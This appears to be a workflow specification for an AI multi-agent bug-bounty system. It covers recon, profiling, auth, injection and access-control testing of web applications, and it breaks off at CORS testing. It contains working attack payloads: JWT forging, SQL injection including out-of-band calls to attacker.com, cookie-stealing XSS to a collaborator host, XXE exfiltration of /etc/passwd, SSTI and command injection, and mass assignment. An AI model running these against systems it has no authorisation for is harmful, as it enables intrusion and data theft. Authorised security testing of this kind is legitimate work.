---
name: W_HUNT_WEB
description: Comprehensive web application security assessment
trigger: Web application URL detected
agents: [AppReviewAgent, XSSAgent, SQLiAgent, NoSQLiAgent, SSRFAgent, IDORAgent, AuthAgent, OAuthAgent, CORSAgent, FileUploadAgent, XXEAgent, RCEAgent, SSTIAgent, CommandInjectionAgent, DeserializationAgent, PathTraversalAgent, OpenRedirectAgent, CRLFAgent, SecretsExposureAgent, BusinessLogicAgent, CSRFAgent, CachePoisoningAgent, HTTPSmugglingAgent, RaceConditionAgent, PrototypePollutionAgent, GraphQLAgent, WebSocketAgent, ValidatorAgent, ExploitChainAgent]
tools: [dev-browser, burp-bridge, credential-vault, auth-manager]
skills_invoked: [WebAssessment, Recon]
---

# W_HUNT_WEB -- Comprehensive Web Application Security Assessment

> **Workflow Owner:** Hunt Orchestrator (hunt-orchestrator.ts)
> **Trigger:** Target classified as web application URL by SecurityHub
> **Estimated Duration:** 2-4 hours (varies by application complexity)
> **Phases:** 10 sequential phases with parallel agent execution within phases

---

## Workflow Activation Criteria

The Hunt Orchestrator dispatches this workflow when ALL of the following are true:

1. Target is an HTTP/HTTPS URL (not APK, IPA, binary, or cloud-only scope)
2. Target responds with HTTP 200/301/302/403 on initial probe
3. Scope validation passes (`is_in_scope()` returns true)
4. No existing hunt session in `running` state for this target (or `--resume` flag set)

```bash
# Orchestrator dispatch check
TARGET_TYPE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET")
if [[ "$TARGET_TYPE" =~ ^(200|301|302|403)$ ]]; then
  echo "DISPATCH: W_HUNT_WEB"
  bun hunt-orchestrator.ts --target "$TARGET" --workflow "W_HUNT_WEB"
fi
```

---

## Pre-Flight Checklist

Before Phase 1 begins, the orchestrator validates:

| Check | Command | Pass Condition |
|-------|---------|----------------|
| Target reachable | `curl -sk -o /dev/null -w "%{http_code}" "$TARGET"` | HTTP response received |
| Scope verified | `bun hunt-orchestrator.ts --scope-check "$TARGET"` | Returns `IN_SCOPE` |
| Credentials loaded | `bun credential-vault.ts --get --target "$TARGET_SLUG"` | At least one credential set |
| Auth strategy set | `bun auth-manager.ts --target "$TARGET" --detect-strategy` | Strategy identified |
| Burp status | `bun burp-bridge.ts --health` | Proxy alive (warn if down, do not block) |
| Session directory | `mkdir -p $SESSION_DIR/{findings,screenshots,artifacts}` | Directory created |
| Prior session check | `bun hunt-orchestrator.ts --target "$TARGET" --status` | No conflicting session |

```
SESSION_DIR=~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}
FINDINGS_DIR=$SESSION_DIR/findings
EVIDENCE_DIR=$SESSION_DIR/screenshots
ARTIFACTS_DIR=$SESSION_DIR/artifacts
```

---

## Phase 1: RECONNAISSANCE

**Agent:** ReconAgent
**Duration:** 10-20 minutes
**Blocking:** Yes -- all subsequent phases depend on recon data
**State:** `phase_1_recon: pending -> running -> completed`

### 1.1 Subdomain Enumeration

```bash
TARGET_DOMAIN=$(echo "$TARGET" | unfurl domain)
RECON_DIR=$SESSION_DIR/recon
mkdir -p $RECON_DIR

# Parallel subdomain enumeration
subfinder -d $TARGET_DOMAIN -silent -all -o $RECON_DIR/subs-subfinder.txt &
assetfinder --subs-only $TARGET_DOMAIN > $RECON_DIR/subs-assetfinder.txt &
amass enum -passive -d $TARGET_DOMAIN -o $RECON_DIR/subs-amass.txt 2>/dev/null &
wait

# Consolidate
cat $RECON_DIR/subs-*.txt | sort -u > $RECON_DIR/all-subs.txt
echo "[RECON] Subdomains found: $(wc -l < $RECON_DIR/all-subs.txt)"
```

### 1.2 Port Scanning

```bash
naabu -list $RECON_DIR/all-subs.txt -silent -top-ports 1000 \
  -o $RECON_DIR/ports.txt -rate 1000

# Identify non-standard web ports
grep -vE ":(80|443)$" $RECON_DIR/ports.txt > $RECON_DIR/non-standard-ports.txt
```

### 1.3 Technology Fingerprinting

```bash
# HTTP probing with tech detection
cat $RECON_DIR/all-subs.txt | httpx -silent -status-code -title -tech-detect \
  -json -o $RECON_DIR/alive-hosts.json -follow-redirects -threads 50

cat $RECON_DIR/alive-hosts.json | jq -r '.url' > $RECON_DIR/alive-urls.txt

# Detailed fingerprinting
httpx -l $RECON_DIR/alive-urls.txt -tech-detect -json \
  -o $RECON_DIR/tech-fingerprint.json

# WhatWeb for deeper analysis
whatweb --input-file=$RECON_DIR/alive-urls.txt --log-json=$RECON_DIR/whatweb.json \
  --aggression 3 2>/dev/null
```

### 1.4 URL Discovery

```bash
# Historical URL mining
unalias gau 2>/dev/null; true
GAU_BIN="${HOME}/go/bin/gau"

cat $RECON_DIR/all-subs.txt | while read sub; do
  $GAU_BIN "$sub" 2>/dev/null
  waybackurls "$sub" 2>/dev/null
done | sort -u | grep -vE "\.(jpg|jpeg|png|gif|svg|ico|css|woff|ttf|eot|mp4|pdf)" \
  > $RECON_DIR/historical-urls.txt

# Active crawling with katana
katana -u "$TARGET" -d 5 -jc -kf -ef css,png,jpg,gif,svg,ico,woff,ttf \
  -o $RECON_DIR/katana-urls.txt -silent

# Consolidate all discovered URLs
cat $RECON_DIR/historical-urls.txt $RECON_DIR/katana-urls.txt | sort -u \
  > $RECON_DIR/all-urls.txt
```

### 1.5 JavaScript File Analysis

```bash
# Extract JS files
grep "\.js$" $RECON_DIR/all-urls.txt | httpx -silent > $RECON_DIR/js-files.txt

# LinkFinder -- extract endpoints from JS
while read jsurl; do
  python3 linkfinder.py -i "$jsurl" -o cli 2>/dev/null
done < $RECON_DIR/js-files.txt | sort -u > $RECON_DIR/js-endpoints.txt

# SecretFinder -- extract secrets from JS
while read jsurl; do
  python3 secretfinder.py -i "$jsurl" -o cli 2>/dev/null
done < $RECON_DIR/js-files.txt > $RECON_DIR/js-secrets.txt

# Manual regex for high-value patterns
cat $RECON_DIR/js-files.txt | while read jsurl; do
  curl -sk "$jsurl" | grep -oEi \
    "(api[_-]?key|apikey|secret|token|password|aws_access|firebase|stripe|private[_-]?key)['\"\s:=]+['\"][A-Za-z0-9/+=_\-]{16,}"
done > $RECON_DIR/js-hardcoded-secrets.txt
```

### 1.6 Directory Brute-Force

```bash
# ffuf with multiple wordlists
ffuf -u "https://$TARGET_DOMAIN/FUZZ" \
  -w ~/.claude/skills/BugBountyFramework/Wordlists/critical-paths.txt \
  -mc 200,301,302,403,405 \
  -o $RECON_DIR/ffuf-dirs.json \
  -of json \
  -t 50 \
  -rate 100

# API endpoint brute-force
ffuf -u "https://$TARGET_DOMAIN/api/FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405 \
  -o $RECON_DIR/ffuf-api.json \
  -of json \
  -t 50

# Hidden parameter discovery
arjun -u "$TARGET" -oJ $RECON_DIR/arjun-params.json 2>/dev/null
```

### 1.7 Google Dorking

```bash
# Automated dorking queries (manual review required)
DORKS=(
  "site:$TARGET_DOMAIN filetype:pdf"
  "site:$TARGET_DOMAIN filetype:sql"
  "site:$TARGET_DOMAIN filetype:env"
  "site:$TARGET_DOMAIN filetype:log"
  "site:$TARGET_DOMAIN inurl:admin"
  "site:$TARGET_DOMAIN inurl:api"
  "site:$TARGET_DOMAIN inurl:debug"
  "site:$TARGET_DOMAIN inurl:test"
  "site:$TARGET_DOMAIN intitle:\"index of\""
  "site:$TARGET_DOMAIN ext:bak|old|backup"
  "site:$TARGET_DOMAIN inurl:login|signin|auth"
  "site:$TARGET_DOMAIN inurl:config|setup|install"
  "\"$TARGET_DOMAIN\" password|secret|api_key site:github.com"
  "\"$TARGET_DOMAIN\" password|secret|api_key site:pastebin.com"
  "\"$TARGET_DOMAIN\" site:trello.com|site:jira.atlassian.net"
)

for dork in "${DORKS[@]}"; do
  echo "DORK: $dork" >> $RECON_DIR/google-dorks.txt
done
```

### Phase 1 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| Subdomains discovered | >= 1 (the target itself) | WARN, continue with target URL only |
| Live hosts identified | >= 1 | FAIL -- target unreachable, abort workflow |
| URLs collected | >= 10 | WARN, continue with limited attack surface |
| Tech stack identified | At least framework + server | WARN, continue with generic testing |
| JS files analyzed | All discovered JS files processed | WARN, continue |

```bash
# Gate validation
LIVE_COUNT=$(wc -l < $RECON_DIR/alive-urls.txt)
URL_COUNT=$(wc -l < $RECON_DIR/all-urls.txt)

if [ "$LIVE_COUNT" -eq 0 ]; then
  bun hunt-orchestrator.ts --target "$TARGET" --phase recon --status failed \
    --reason "No live hosts found"
  exit 1
fi

bun hunt-orchestrator.ts --target "$TARGET" --phase recon --status completed \
  --data "{\"subs\": $(wc -l < $RECON_DIR/all-subs.txt), \"urls\": $URL_COUNT, \"live\": $LIVE_COUNT}"
```

---

## Phase 2: APPLICATION PROFILING

**Agent:** AppReviewAgent
**Duration:** 10-15 minutes
**Blocking:** Yes -- AppProfile is required by all downstream agents
**State:** `phase_2_profiling: pending -> running -> completed`

### 2.1 Authenticated Session Establishment

```bash
# Establish auth session before profiling
bun auth-manager.ts --target "$TARGET" \
  --authenticate \
  --strategy auto \
  --creds-from "vault:$TARGET_SLUG"

# Verify session
bun auth-manager.ts --target "$TARGET" --check
SESSION_COOKIE=$(bun credential-vault.ts --get --target "$TARGET_SLUG" --field cookie)
```

### 2.2 Application Flow Mapping (dev-browser)

```bash
# Map all application flows through dev-browser
bun playwright-harness.ts \
  --target "$TARGET" \
  --auth-cookie "$SESSION_COOKIE" \
  --proxy "http://127.0.0.1:8080" \
  --mode map-flows \
  --crawl-depth 5 \
  --output /tmp/app-profile.json

# If dev-browser unavailable, fallback to Playwright CLI
# playwright crawl --url "$TARGET" --depth 5 --output /tmp/app-profile.json
```

### 2.3 AppProfile Generation

The AppReviewAgent produces `/tmp/app-profile.json` containing:

```json
{
  "app_narrative": "Description of what the application does",
  "crown_jewels": ["PII database", "payment processing", "admin panel"],
  "tech_stack": {
    "framework": "React/Next.js",
    "server": "Node.js/Express",
    "database": "PostgreSQL",
    "cloud": "AWS",
    "auth_pattern": "JWT + OAuth2",
    "waf": "Cloudflare",
    "cdn": "CloudFront"
  },
  "high_value_flows": [
    {
      "flow": "User registration and login",
      "endpoint": "POST /api/auth/login",
      "why_interesting": "JWT issued with user role claims",
      "agents": ["AuthAgent", "IDORAgent"],
      "priority": "critical"
    }
  ],
  "trust_boundaries": [
    {
      "boundary": "Client -> API Gateway",
      "crossing": "JWT validation at gateway",
      "risk": "JWT bypass could skip all authorization"
    }
  ],
  "ai_features_detected": false,
  "graphql_detected": false,
  "websocket_detected": false,
  "file_upload_detected": true,
  "api_endpoints": [],
  "attack_priority_order": []
}
```

### 2.4 Tech Stack Deep Analysis

```bash
# Extract CSP headers
curl -sk -D- "$TARGET" | grep -i "content-security-policy" > $SESSION_DIR/csp-headers.txt

# Extract all security headers
curl -sk -D- "$TARGET" | grep -iE \
  "^(x-frame-options|x-content-type|x-xss-protection|strict-transport|content-security|referrer-policy|permissions-policy|cross-origin)" \
  > $SESSION_DIR/security-headers.txt

# Cookie attribute analysis
curl -sk -D- "$TARGET" | grep -i "set-cookie" > $SESSION_DIR/cookie-analysis.txt
```

### 2.5 Trust Boundary Mapping

AppReviewAgent identifies trust boundaries:

- Client-side vs server-side validation
- API gateway vs backend service authorization
- Multi-tenant data isolation boundaries
- Admin vs user privilege boundaries
- Internal microservice communication trust

### 2.6 Crown Jewel Identification

Priority targets for all agents:

- Authentication tokens and session stores
- PII (names, emails, SSNs, payment data)
- Financial transaction endpoints
- Admin functionality
- File storage and retrieval
- Inter-service communication channels

### 2.7 API Endpoint Discovery

```bash
# Merge endpoints from all sources
cat $RECON_DIR/js-endpoints.txt \
    $RECON_DIR/ffuf-api.json \
    <(cat /tmp/app-profile.json | jq -r '.api_endpoints[]') \
  | sort -u > $SESSION_DIR/all-api-endpoints.txt

# OpenAPI/Swagger detection
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /v2/api-docs /v3/api-docs; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${path}")
  if [[ "$STATUS" =~ ^(200|301|302)$ ]]; then
    echo "SWAGGER_FOUND: ${TARGET}${path}" >> $SESSION_DIR/api-discovery.txt
    curl -sk "${TARGET}${path}" > $SESSION_DIR/swagger-spec.json
  fi
done
```

### Phase 2 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| AppProfile generated | `/tmp/app-profile.json` exists and valid JSON | FAIL -- cannot proceed without profiling |
| High-value flows identified | >= 3 flows | WARN, continue with available flows |
| Tech stack identified | Framework + server at minimum | WARN, use generic attack patterns |
| Auth session valid | `auth-manager --check` returns OK | RETRY auth, then WARN |
| Crown jewels identified | >= 1 | WARN, test all endpoints equally |

```bash
# Gate validation
if [ ! -f /tmp/app-profile.json ] || ! jq empty /tmp/app-profile.json 2>/dev/null; then
  bun hunt-orchestrator.ts --target "$TARGET" --phase profiling --status failed \
    --reason "AppProfile generation failed"
  exit 1
fi

FLOW_COUNT=$(jq '.high_value_flows | length' /tmp/app-profile.json)
bun hunt-orchestrator.ts --target "$TARGET" --phase profiling --status completed \
  --data "{\"flows\": $FLOW_COUNT}"

# Enrich AppProfile with recon data
jq --argjson subs "$(cat $RECON_DIR/all-subs.txt | jq -R . | jq -s .)" \
   --argjson urls "$(cat $RECON_DIR/all-urls.txt | head -500 | jq -R . | jq -s .)" \
   '.recon = {subdomains: $subs, urls: $urls}' \
   /tmp/app-profile.json > /tmp/app-profile-enriched.json && \
   mv /tmp/app-profile-enriched.json /tmp/app-profile.json
```

---

## Phase 3: AUTHENTICATION TESTING

**Agent:** AuthAgent
**Duration:** 15-25 minutes
**Blocking:** Yes -- auth findings inform IDORAgent and privilege escalation testing
**State:** `phase_3_auth: pending -> running -> completed`

### Agent Dispatch

```
Agent({
  description: "AuthAgent -- Authentication and authorization bypass testing",
  prompt: "<AuthAgent.md> + auth hypothesis from AppProfile",
  name: "auth-hunter",
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE",
    focus: "auth_bypass_ato"
  },
  output: "$FINDINGS_DIR/auth-findings.json"
})
```

### 3.1 Login Flow Analysis

```bash
# Capture login request/response via Burp
bun burp-bridge.ts --history --filter "url:/login|/auth|/signin,method:POST" \
  --output $ARTIFACTS_DIR/login-flows.json

# Test for username enumeration
# Different responses for valid vs invalid usernames
curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"known-valid-user@test.com","password":"wrong"}' \
  -o /tmp/valid-user-response.json -w "%{http_code}:%{time_total}"

curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent-user-xyz@test.com","password":"wrong"}' \
  -o /tmp/invalid-user-response.json -w "%{http_code}:%{time_total}"

# Compare response length, status code, and timing
diff /tmp/valid-user-response.json /tmp/invalid-user-response.json
```

### 3.2 Password Policy Testing

- Minimum length enforcement
- Complexity requirements bypass
- Common password acceptance
- Password history enforcement
- Account lockout threshold and bypass

### 3.3 Session Management Testing

```bash
# Session fixation: Can we set a session before auth?
curl -sk -c /tmp/pre-auth-cookies.txt "$TARGET"
# Login with pre-auth cookie and check if session ID changes
curl -sk -b /tmp/pre-auth-cookies.txt -c /tmp/post-auth-cookies.txt \
  -X POST "$TARGET/api/auth/login" -d '{"username":"...","password":"..."}'
# If session ID is same pre/post auth = SESSION FIXATION

# Session prediction: Collect multiple session tokens, analyze entropy
for i in $(seq 1 20); do
  curl -sk -D- "$TARGET" | grep -i "set-cookie" | grep -oP "session=[^;]+" >> /tmp/session-tokens.txt
done
# Analyze with Burp Sequencer or custom entropy analysis

# Session expiry: Does the session actually expire?
# Login, wait, then test if old session still works
```

### 3.4 JWT Attacks

```bash
# Decode JWT and analyze
JWT_TOKEN=$(echo "$SESSION_COOKIE" | grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

# None algorithm attack
HEADER=$(echo "$JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null)
PAYLOAD=$(echo "$JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)
# Forge with alg:none
FORGED_HEADER=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED_TOKEN="${FORGED_HEADER}.$(echo "$JWT_TOKEN" | cut -d. -f2)."

# Key confusion attack (RS256 -> HS256)
# If public key is known, sign with HS256 using the public key as HMAC secret

# Claim tampering
# Modify role: "user" -> "admin", user_id, email claims
# Test with jwt_tool:
python3 jwt_tool.py "$JWT_TOKEN" -X a  # alg:none
python3 jwt_tool.py "$JWT_TOKEN" -X k -pk /tmp/public-key.pem  # key confusion
python3 jwt_tool.py "$JWT_TOKEN" -T -S hs256 -p "secret"  # weak secret
python3 jwt_tool.py "$JWT_TOKEN" -C -d /usr/share/wordlists/jwt-secrets.txt  # crack
```

### 3.5 OAuth/OIDC Flaws

```bash
# redirect_uri manipulation
# Test: open redirect on same domain used as redirect_uri
# Test: path traversal in redirect_uri
# Test: subdomain injection in redirect_uri
# Test: fragment injection (#evil.com)

# State parameter bypass
# Test: Remove state parameter entirely
# Test: Reuse old state values
# Test: Predictable state values

# Token leakage
# Test: Authorization code in Referer header (HTTP downgrade)
# Test: Token in URL fragment vs query parameter
# Test: Code reuse after exchange
```

### 3.6 MFA Bypass Techniques

- Rate limit brute-force on OTP endpoint
- Response manipulation (change `"success": false` to `true`)
- Backup code enumeration
- MFA enrollment bypass (skip the setup step)
- Session persistence after MFA challenge (partial login state)
- Race condition on MFA verification

### 3.7 Password Reset Flow Abuse

```bash
# Host header injection on password reset
curl -sk -X POST "$TARGET/api/auth/forgot-password" \
  -H "Host: attacker.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -d '{"email":"victim@test.com"}'

# Token analysis
# Request multiple reset tokens, analyze for predictability
# Test token reuse after password change
# Test token expiry
```

### Phase 3 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| Login flow tested | All auth endpoints exercised | WARN |
| JWT analysis complete | If JWT present, all attacks tested | WARN |
| OAuth tested | If OAuth present, redirect_uri + state tested | WARN |
| Session management tested | Fixation + expiry + prediction | WARN |
| Auth findings documented | Results in `$FINDINGS_DIR/auth-findings.json` | Required |

```bash
bun hunt-orchestrator.ts --target "$TARGET" --phase auth --status completed \
  --findings "$FINDINGS_DIR/auth-findings.json"
```

---

## Phase 4: INJECTION TESTING

**Agents:** SQLiAgent, XSSAgent, XXEAgent, RCEAgent
**Execution:** PARALLEL (all 4 agents run simultaneously)
**Duration:** 20-30 minutes
**State:** `phase_4_injection: pending -> running -> completed`
**Max Concurrent Agents:** 4

### Agent Dispatch Table

| Agent | Input | Output | Focus | Timeout |
|-------|-------|--------|-------|---------|
| SQLiAgent | AppProfile, all-urls.txt, params.txt | `$FINDINGS_DIR/sqli-findings.json` | Union, blind, time-based, error-based, second-order, NoSQL | 15 min |
| XSSAgent | AppProfile, all-urls.txt, CSP headers | `$FINDINGS_DIR/xss-findings.json` | Stored, reflected, DOM, blind, mutation XSS | 15 min |
| XXEAgent | AppProfile, XML endpoints | `$FINDINGS_DIR/xxe-findings.json` | Classic, blind, OOB, parameter entity, SVG XXE | 15 min |
| RCEAgent | AppProfile, upload endpoints, SSTI candidates | `$FINDINGS_DIR/rce-findings.json` | OS command, SSTI, deserialization, SSRF-to-RCE | 15 min |

### Parallel Dispatch

```
# All 4 agents dispatched in a single message for true parallelism

Agent({
  description: "SQLiAgent -- SQL and NoSQL injection testing",
  prompt: "<SQLiAgent.md> + injection hypothesis from AppProfile",
  name: "sqli-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE",
    urls: "$RECON_DIR/all-urls.txt",
    params: "$RECON_DIR/arjun-params.json"
  },
  output: "$FINDINGS_DIR/sqli-findings.json"
})

Agent({
  description: "XSSAgent -- Cross-site scripting testing",
  prompt: "<XSSAgent.md> + XSS hypothesis from AppProfile",
  name: "xss-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE",
    csp_headers: "$SESSION_DIR/csp-headers.txt"
  },
  output: "$FINDINGS_DIR/xss-findings.json"
})

Agent({
  description: "XXEAgent -- XML external entity injection testing",
  prompt: "<XXEAgent.md> + XXE hypothesis from AppProfile",
  name: "xxe-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE"
  },
  output: "$FINDINGS_DIR/xxe-findings.json"
})

Agent({
  description: "RCEAgent -- Remote code execution testing",
  prompt: "<RCEAgent.md> + RCE hypothesis from AppProfile",
  name: "rce-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE"
  },
  output: "$FINDINGS_DIR/rce-findings.json"
})
```

### 4.1 SQL Injection (SQLiAgent)

**Attack Vectors:**

| Technique | Detection Method | Payloads |
|-----------|-----------------|----------|
| Union-based | Column count enumeration, data extraction | `' UNION SELECT NULL,NULL--`, `' UNION SELECT username,password FROM users--` |
| Error-based | Database error message extraction | `' AND 1=CONVERT(int,(SELECT @@version))--` |
| Blind boolean | Response differential analysis | `' AND 1=1--` vs `' AND 1=2--` |
| Time-based blind | Response timing analysis | `' AND SLEEP(5)--`, `'; WAITFOR DELAY '0:0:5'--` |
| Second-order | Stored input used in later query | Register with `admin'--` as username, check admin panel |
| Stacked queries | Multiple statement execution | `'; DROP TABLE test--` (test safely) |
| Out-of-band | DNS/HTTP exfiltration | `'; EXEC xp_dirtree '\\attacker.com\share'--` |

```bash
# Automated SQLi with sqlmap
sqlmap -u "$TARGET/search?q=test" \
  --batch --smart --level 3 --risk 2 \
  --cookie="$SESSION_COOKIE" \
  --output-dir=$ARTIFACTS_DIR/sqlmap/ \
  --forms --crawl=3 \
  --tamper=space2comment,between,randomcase

# NoSQL injection testing
# MongoDB injection
curl -sk "$TARGET/api/users/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# LDAP injection testing
curl -sk "$TARGET/search?user=*)(uid=*))(|(uid=*"

# XPath injection testing
curl -sk "$TARGET/search?q=') or ('1'='1"
```

### 4.2 Cross-Site Scripting (XSSAgent)

**Attack Vectors:**

| Type | Context | Priority Payloads |
|------|---------|-------------------|
| Stored XSS | User input rendered to other users | `<img src=x onerror=fetch('https://COLLAB/'+document.cookie)>` |
| Reflected XSS | URL parameter reflected in response | `"><svg onload=alert(document.domain)>` |
| DOM XSS | Client-side JS processes URL/hash | `#<img src=x onerror=alert(1)>` |
| Blind XSS | Input rendered in admin/internal panels | `"><script src=https://COLLAB/xss.js></script>` |
| Mutation XSS | Browser mutation causes execution | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |

```bash
# Dalfox automated scanning
dalfox url "$TARGET/search?q=FUZZ" \
  -b "https://$INTERACTSH_SERVER" \
  --header "Cookie: $SESSION_COOKIE" \
  --waf-evasion \
  --format json \
  --output $FINDINGS_DIR/dalfox-findings.json

# DOM source/sink analysis via dev-browser
bun playwright-harness.ts --target "$TARGET" --mode dom-xss-scan \
  --output $FINDINGS_DIR/dom-sinks.json

# Blind XSS payload injection into all input fields
BLIND_PAYLOAD="<script src=https://$INTERACTSH_SERVER/xss.js></script>"
# Inject into: contact forms, support tickets, user profiles, feedback, file names
```

### 4.3 XML External Entity (XXEAgent)

**Attack Vectors:**

```xml
<!-- Classic XXE: File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind XXE: OOB exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- Parameter entity XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
  %eval;
  %exfil;
]>

<!-- XXE via file upload (XLSX, DOCX, SVG) -->
<!-- Modify content.xml inside XLSX -->
<!-- SVG XXE -->
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Target endpoints:** XML APIs, SOAP services, file upload (XLSX/DOCX/SVG), RSS feeds, SAML SSO

### 4.4 Remote Code Execution (RCEAgent)

**Attack Vectors:**

| Vector | Detection | Exploitation |
|--------|-----------|-------------|
| OS command injection | Time-based (`; sleep 5`), OOB (`; curl COLLAB`) | `; id; cat /etc/passwd` |
| SSTI | `{{7*7}}` renders `49` | Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Deserialization | Known gadget chains per framework | Java: ysoserial, .NET: ysoserial.net, PHP: phpggc, Python: pickle |
| Expression Language | `${7*7}` in Java EL, Spring SpEL | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| File inclusion | Path traversal to include executable | `?page=....//....//etc/passwd`, `?page=php://filter/convert.base64-encode/resource=index` |

```bash
# SSTI detection across template engines
for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}' '{{7*"7"}}'; do
  RESPONSE=$(curl -sk "$TARGET/search?q=$payload")
  if echo "$RESPONSE" | grep -q "49"; then
    echo "SSTI DETECTED: $payload -> 49"
  fi
done

# Command injection with time-based detection
for sep in ';' '|' '||' '&&' '`' '$(' '%0a'; do
  START=$(date +%s)
  curl -sk "$TARGET/api/ping?host=127.0.0.1${sep}sleep+5" > /dev/null
  END=$(date +%s)
  DIFF=$((END - START))
  if [ "$DIFF" -ge 4 ]; then
    echo "CMD INJECTION via separator: $sep"
  fi
done
```

### Phase 4 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| All injection agents completed | 4/4 agents returned results | WARN on partial, continue |
| SQLi endpoints tested | All parameterized endpoints from AppProfile | Required |
| XSS reflection points tested | All user-input-rendered endpoints | Required |
| XXE XML endpoints tested | All XML-accepting endpoints | Required if XML detected |
| RCE SSTI/command surfaces tested | All dynamic execution points | Required |
| Findings deduplicated | No duplicate findings across agents | Required |

```bash
# Wait for all injection agents
# Aggregate findings
jq -s 'add' $FINDINGS_DIR/sqli-findings.json \
  $FINDINGS_DIR/xss-findings.json \
  $FINDINGS_DIR/xxe-findings.json \
  $FINDINGS_DIR/rce-findings.json \
  > $FINDINGS_DIR/phase4-injection-all.json

bun hunt-orchestrator.ts --target "$TARGET" --phase injection --status completed \
  --findings "$FINDINGS_DIR/phase4-injection-all.json"
```

---

## Phase 5: ACCESS CONTROL TESTING

**Agents:** IDORAgent, CORSAgent, CSRFAgent
**Execution:** PARALLEL (all 3 agents run simultaneously)
**Duration:** 15-25 minutes
**State:** `phase_5_access_control: pending -> running -> completed`
**Dependency:** Phase 3 (AuthAgent) must be completed -- auth tokens and role data required

### Agent Dispatch Table

| Agent | Input | Output | Focus | Timeout |
|-------|-------|--------|-------|---------|
| IDORAgent | AppProfile, auth tokens for 2+ accounts | `$FINDINGS_DIR/idor-findings.json` | BOLA, BFLA, horizontal/vertical escalation, UUID prediction | 15 min |
| CORSAgent | AppProfile, alive-urls.txt | `$FINDINGS_DIR/cors-findings.json` | Origin reflection, null origin, wildcard subdomain, credential sharing | 10 min |
| CSRFAgent | AppProfile, state-changing endpoints | `$FINDINGS_DIR/csrf-findings.json` | Token bypass, SameSite bypass, content-type tricks | 10 min |

### Parallel Dispatch

```
Agent({
  description: "IDORAgent -- IDOR/BOLA/BFLA testing with two-account pattern",
  prompt: "<IDORAgent.md> + IDOR hypothesis from AppProfile",
  name: "idor-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    user_a_cookie: "$SESSION_COOKIE_A",
    user_b_cookie: "$SESSION_COOKIE_B"
  },
  output: "$FINDINGS_DIR/idor-findings.json"
})

Agent({
  description: "CORSAgent -- CORS misconfiguration testing",
  prompt: "<CORSAgent.md> + CORS hypothesis from AppProfile",
  name: "cors-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    alive_urls: "$RECON_DIR/alive-urls.txt"
  },
  output: "$FINDINGS_DIR/cors-findings.json"
})

Agent({
  description: "CSRFAgent -- CSRF protection bypass testing",
  prompt: "CSRF bypass testing agent",
  name: "csrf-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE"
  },
  output: "$FINDINGS_DIR/csrf-findings.json"
})
```

### 5.1 IDOR Testing (IDORAgent)

```bash
# Two-account testing pattern (MANDATORY for IDOR)
# Account A: standard user
# Account B: different standard user
# Account C: admin (if available)

# Horizontal privilege escalation
# Access Account B's resources using Account A's session
curl -sk "$TARGET/api/users/USER_B_ID/profile" \
  -H "Cookie: $SESSION_COOKIE_A" \
  -o /tmp/idor-horizontal.json

# Vertical privilege escalation
# Access admin endpoints using standard user session
curl -sk "$TARGET/api/admin/users" \
  -H "Cookie: $SESSION_COOKIE_A" \
  -o /tmp/idor-vertical.json

# UUID prediction testing
# Collect multiple UUIDs, analyze for sequential patterns
# Test UUID v1 (time-based, predictable) vs v4 (random)

# Mass assignment
curl -sk -X PUT "$TARGET/api/users/me" \
  -H "Cookie: $SESSION_COOKIE_A" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":["*"]}'
```

### 5.2 CORS Testing (CORSAgent)

```bash
# Origin reflection test
